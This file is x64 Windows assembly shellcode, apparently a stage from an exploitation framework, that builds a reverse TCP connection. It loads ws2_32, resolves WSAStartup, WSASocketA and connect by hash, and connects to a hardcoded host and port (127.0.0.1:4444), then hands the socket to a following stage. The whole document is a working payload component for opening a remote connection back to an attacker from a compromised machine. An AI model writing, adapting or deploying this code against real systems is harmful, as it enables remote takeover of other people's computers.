;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2003
; Architecture: x64
;-----------------------------------------------------------------------------;
[BITS 64]

; Input: RBP must be the address of 'api_call'.
; Output: RDI will be the socket for the connection to the server
; Clobbers: RAX, RCX, RDX, RDI, R8, R9, R10, R12, R13, R14, R15

reverse_tcp:
  ; setup the structures we need on the stack...
  mov r14, 'ws2_32'
  push r14               ; Push the bytes 'ws2_32',0,0 onto the stack.
  mov r14, rsp           ; save pointer to the "ws2_32" string for LoadLibraryA call.
  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)
  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.
  mov r12, 0x0100007F5C110002        
  push r12               ; host 127.0.0.1, family AF_INET and port 4444
  mov r12, rsp           ; save pointer to sockaddr struct for connect call
  ; perform the call to LoadLibraryA...
  mov rcx, r14           ; set the param for the library to load
  mov r10d, 0x0726774C   ; hash( "kernel32.dll", "LoadLibraryA" )
  call rbp               ; LoadLibraryA( "ws2_32" )
  ; perform the call to WSAStartup...
  mov rdx, r13           ; second param is a pointer to this stuct
  push 0x0101            ;
  pop rcx                ; set the param for the version requested
  mov r10d, 0x006B8029   ; hash( "ws2_32.dll", "WSAStartup" )
  call rbp               ; WSAStartup( 0x0101, &WSAData );
  ; perform the call to WSASocketA...
  push rax               ; if we succeed, rax wil be zero, push zero for the flags param.
  push rax               ; push null for reserved parameter
  xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure
  xor r8, r8             ; we do not specify a protocol
  inc rax                ;
  mov rdx, rax           ; push SOCK_STREAM
  inc rax                ;
  mov rcx, rax           ; push AF_INET
  mov r10d, 0xE0DF0FEA   ; hash( "ws2_32.dll", "WSASocketA" )
  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
  mov rdi, rax           ; save the socket for later
  ; perform the call to connect...
  push byte 16           ; length of the sockaddr struct
  pop r8                 ; pop off the third param
  mov rdx, r12           ; set second param to pointer to sockaddr struct
  mov rcx, rdi           ; the socket
  mov r10d, 0x6174A599   ; hash( "ws2_32.dll", "connect" )
  call rbp               ; connect( s, &sockaddr, 16 );
  ; restore RSP so we dont have any alignment issues with the next block...
  add rsp, ( (408+8) + (8*4) + (32*4) ) ; cleanup the stack allocations
  